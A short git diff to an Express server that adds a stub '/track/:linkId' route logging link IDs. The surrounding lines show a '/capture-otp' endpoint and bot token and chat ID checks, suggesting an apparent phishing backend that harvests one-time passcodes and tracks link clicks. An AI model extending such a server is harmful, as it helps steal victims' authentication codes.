@@ -161,6 +161,15 @@ app.post("/capture-otp", (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
+
+app.get("/track/:linkId", (req, res) => {
+  console.log("TRACK ROUTE HIT:", req.params.linkId);
+
+  res.status(200).json({
+    message: "Tracking route works!",
+    linkId: req.params.linkId,
+  });
+});
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
   if (!TOKEN || !CHAT_IDS) {
